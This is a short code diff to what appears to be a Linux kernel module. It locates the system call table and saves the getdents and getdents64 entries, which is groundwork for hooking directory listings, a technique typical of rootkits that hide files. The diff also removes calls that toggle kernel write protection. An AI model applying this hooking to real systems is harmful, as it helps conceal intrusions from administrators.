@@ -2,12 +2,10 @@
 
 #include "hook.h"
 
-
 void **sys_calls;
 
-asmlinkage long (*sys_getdents)(unsigned, struct linux_dirent *, unsigned);
-asmlinkage long (*sys_getdents64)(unsigned, struct linux_dirent64 *, unsigned);
-
+asmlinkage long (*sys_getdents)(unsigned, struct linux_dirent __user *, unsigned);
+asmlinkage long (*sys_getdents64)(unsigned, struct linux_dirent64 __user *, unsigned);
 
 int
 retrieve_sys_call_table(void)
@@ -19,12 +17,8 @@ retrieve_sys_call_table(void)
 void
 init_hooks(void)
 {
-    disable_protection();
-
     sys_getdents = (void *)sys_calls[__NR_getdents];
     sys_getdents64 = (void *)sys_calls[__NR_getdents64];
-
-    enable_protection();
 }
 
 void
